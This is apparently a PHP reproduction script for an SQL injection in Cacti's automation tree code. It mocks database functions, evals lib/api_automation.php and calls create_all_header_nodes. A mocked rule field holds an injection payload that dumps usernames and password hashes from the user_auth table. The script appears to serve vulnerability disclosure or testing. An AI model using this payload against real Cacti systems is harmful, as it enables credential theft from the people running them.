<?php
// Mocking the Cacti environment to demonstrate SQL injection
// without needing a real database connection.

function db_fetch_assoc_prepared($sql, $params) {
    if (strpos($sql, 'FROM automation_tree_rule_items') !== false) {
        return array(
            array(
                'field' => '(SELECT GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a) FROM user_auth)',
                'search_pattern' => '',
                'replace_pattern' => '',
                'propagate_changes' => ''
            )
        );
    }
    return array();
}

function db_fetch_cell($sql, $params = array(), $display_error = true) {
    echo "EXECUTING SQL: $sql\n";
    return "mocked_result";
}

function cacti_sizeof($arr) {
    return is_array($arr) ? count($arr) : 0;
}

function automation_function_with_pid($name) {
    return $name;
}

function cacti_log($msg, $a, $b, $c) {
    // echo "LOG: $msg\n";
}

function create_multi_header_node($target, $rule, $tree_item, $parent_tree_item_id) {
    echo "Creating node with title: $target\n";
    return 123;
}

define('TREE_ITEM_TYPE_HOST', 1);
define('TREE_ITEM_TYPE_GRAPH', 2);
define('AUTOMATION_TREE_ITEM_TYPE_STRING', 'string');
define('AUTOMATION_RULE_TYPE_TREE_MATCH', 1);
define('POLLER_VERBOSITY_HIGH', 1);
define('POLLER_VERBOSITY_DEBUG', 2);

// Include the file containing create_all_header_nodes
// We need to bypass the real database calls in that file too if any.
// Since we defined the functions above, if they are not defined in api_automation.php
// or if we can prevent it from including global.php, it should work.

$file_content = file_get_contents('lib/api_automation.php');
// Remove inclusion of global.php or other files that might trigger db connection
$file_content = preg_replace('/include_once\(.*?\);/', '', $file_content);
$file_content = str_replace('<?php', '', $file_content);
$file_content = str_replace('?>', '', $file_content);

// Evaluate the code
eval($file_content);

$rule = array(
    'id' => 9999,
    'tree_id' => 1,
    'tree_item_id' => 0,
    'leaf_type' => TREE_ITEM_TYPE_HOST,
    'name' => 'Repro Rule'
);

$item_id = 456; // Mock host_id

echo "Calling create_all_header_nodes with item_id=$item_id and rule_id=" . $rule['id'] . "\n";

create_all_header_nodes($item_id, $rule);

?>
